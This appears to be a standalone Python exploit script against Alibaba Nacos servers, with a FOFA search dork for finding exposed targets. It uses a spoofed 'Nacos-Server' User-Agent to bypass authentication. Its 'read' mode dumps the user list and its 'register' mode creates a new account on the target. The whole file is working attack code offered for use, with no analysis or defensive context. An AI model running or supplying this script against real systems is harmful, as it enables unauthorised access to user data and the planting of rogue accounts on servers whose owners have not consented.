#!/usr/bin/python3
#Author 9527
#fofa dork: title="Nacos"

import sys
import requests
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

if(len(sys.argv) < 2):
	print("|-----------------------------------------------------------------------------------|")
	print("|                                  Alibaba Nacos                                    |")
	print("|             UseAge: python3 exploit.py moudle url username password               |")
	print("|    Example: python3 exploit.py read https://192.168.1.2/                          |")
	print("|             python3 exploit.py register https://192.168.1.2/ user123 pwd123       |")
	print("|___________________________________________________________________________________|")
	exit()

modoule = sys.argv[1]

headers = {
                    "User-Agent": "Nacos-Server",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                    "Accept-Encoding": "gzip, deflate",
                    "DNT": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
            }


print("[!] --------Attacking the target!--------")
print("[/]======================================")

if(sys.argv[1] == 'read'):
	if(len(sys.argv) < 3):
		print("python3 exploit.py read https://192.168.1.2/")
		exit()
	else:
		target = sys.argv[2]
		ReadPayload = target + "nacos/v1/auth/users?pageNo=1&pageSize=100"
		try:
			requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
			response = requests.get(url = ReadPayload,headers = headers,verify = False,timeout = 10)
			if(response.status_code == 200):
				print("[+] Read user successfully!")
				response_json = json.dumps(response.json(), indent=4)
				print(response_json)
				response.close()
				exit()
			else:
				print("[-] Read user Failed!")
				exit()
		except Exception as e:
			print("[-] Server Error!")
			exit()

elif(sys.argv[1] == 'register'):
	if(len(sys.argv) < 5):
		print("")
		exit()
	else:
		target = sys.argv[2]
		username = sys.argv[3]
		password = sys.argv[4]
		data = "username=" + username + "&" +"password=" + password
		Rigspayload = target + "nacos/v1/auth/users"
		try:
			requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
			response = requests.post(url = Rigspayload,data = data,headers = headers,verify =False,timeout = 10)
			if(response.status_code == 200):
				print("[+] Target is vuln!")
				time.sleep(1)
				print("[+]Resiter successfully!")
				print("Username: " + username)
				print("Password: " + password)
				response.close()
				exit()
			else:
				print("[-] Target is not vuln!")
				print("[-] Exploit Failed")
				exit()
		except Exception as e:
			print("[-] Server Error!")
			exit()
else:
	print("[-] Error moudle!")
	print("Please useing \"read\" or \"register\"")
	exit()